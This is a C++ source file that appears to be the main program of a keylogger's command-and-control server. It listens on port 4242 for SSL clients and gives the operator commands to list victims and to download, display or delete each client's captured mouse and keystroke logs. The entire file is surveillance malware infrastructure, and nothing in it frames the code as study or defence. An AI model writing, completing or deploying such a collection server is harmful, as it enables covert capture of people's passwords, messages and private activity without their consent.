#include <iostream>
#include <string>
#include <cstring>
#include <algorithm>
#include <functional>
#include <map>

#include "TCPServer.hpp"
#include "SSLTCPClient.hpp"
#include "Protocol.hpp"
#include "parser.hpp"

void checkDataSizeMatch(int &read, char *buffer, Parser &parser)
{
  if (read == sizeof(t_cmd))
    parser.parseNetwork(buffer);
}

void checkNetworkData(char *buffer, Parser &parser, std::vector<SSLTCPClient *>::iterator &clientIt, TCPServer &server)
{
  int read = 0;

  if ((read = ((*clientIt)->receiveData(buffer, sizeof(t_cmd)))) == 0)
    {
      std::cout << "Client disconected" << std::endl;
      server.disconectClient(*clientIt);
      (*clientIt)->disconnectFromHost();
    }
  else if (read > 0)
    checkDataSizeMatch(read, buffer, parser);
}

int main(int argc, char **argv)
{
  TCPServer server;
  std::vector<SSLTCPClient*> clientsList;
  char buffer[sizeof(t_cmd)];
  char cmd_buffer[255];
  Parser parser(server, clientsList);

  parser.unblockRead();
  server.listenClients("0.0.0.0", "4242", 300);
  std::cout << "Available commands:" << std::endl;
  std::cout << "LIST : List connected clients ID." << std::endl;
  std::cout << "DOWNLOAD_LOG [ID] : Download log for client ID." << std::endl;
  std::cout << "DISPLAY_LOG [ID] : Display mouse and keystroke log for client ID." << std::endl;
  std::cout << "PURGE_LOG [ID] : Delete log for client ID." << std::endl;
  std::cout << "CLOSE [ID] : Close client ID." << std::endl << std::endl;

  while (server.isListening())
    {
      parser.parseCommands();
      server.waitForClientsActivity();
      if (server.incomingConnection())
	{
	  SSLTCPClient* client = server.getIncomingCLient();
	  clientsList.push_back(client);
	}
      for (auto clientIt = clientsList.begin(); clientIt != clientsList.end(); clientIt++)
	{
	  if (server.checkSocket(*clientIt) && (*clientIt)->isConnected())
	    checkNetworkData(buffer, parser, clientIt, server);
	}
    }
  return (0);
}
